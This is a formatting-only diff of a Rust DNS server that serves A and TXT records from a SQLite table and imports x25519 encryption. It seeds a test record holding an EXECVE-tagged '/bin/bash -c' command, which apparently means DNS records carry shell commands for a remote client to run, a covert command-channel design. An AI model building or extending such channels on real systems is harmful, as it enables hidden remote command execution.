@@ -9,8 +9,8 @@ use users::get_current_uid;
 use x25519_dalek::{PublicKey, SharedSecret, StaticSecret};
 
 use hickory_proto::op::Message;
-use hickory_proto::rr::{RData, Record, RecordType};
 use hickory_proto::rr::RecordType::TXT;
+use hickory_proto::rr::{RData, Record, RecordType};
 use std::collections::HashMap;
 use std::net::{Ipv4Addr, SocketAddr};
 use std::str::FromStr;
@@ -113,12 +113,22 @@ fn build_response(
             match q.query_type() {
                 RecordType::A => {
                     let addr = val.parse::<Ipv4Addr>()?;
-                    resp.add_answer(Record::from_rdata(q.name().clone(), 300, RData::A(hickory_proto::rr::rdata::A(addr))));
+                    resp.add_answer(Record::from_rdata(
+                        q.name().clone(),
+                        300,
+                        RData::A(hickory_proto::rr::rdata::A(addr)),
+                    ));
                 }
                 RecordType::TXT => {
-                    resp.add_answer(Record::from_rdata(q.name().clone(), 300, RData::TXT(hickory_proto::rr::rdata::TXT::new(vec![val.clone()]))));
+                    resp.add_answer(Record::from_rdata(
+                        q.name().clone(),
+                        300,
+                        RData::TXT(hickory_proto::rr::rdata::TXT::new(vec![val.clone()])),
+                    ));
                 }
-                _ => { println!("not implemented type"); }
+                _ => {
+                    println!("not implemented type");
+                }
             }
         }
     }
@@ -254,7 +264,11 @@ async fn init_db(path: &Path) -> rusqlite::Result<Connection, rusqlite::Error> {
     )?;
     conn.execute(
         "INSERT INTO records (name, record_type, value) VALUES (?1, ?2, ?3)",
-        ("testing", u16::from(RecordType::A), format!("{EXECVE}/bin/bash -c '/bin/echo test > ")),
+        (
+            "testing",
+            u16::from(RecordType::A),
+            format!("{EXECVE}/bin/bash -c '/bin/echo test > "),
+        ),
     )?;
     Ok(conn)
 }
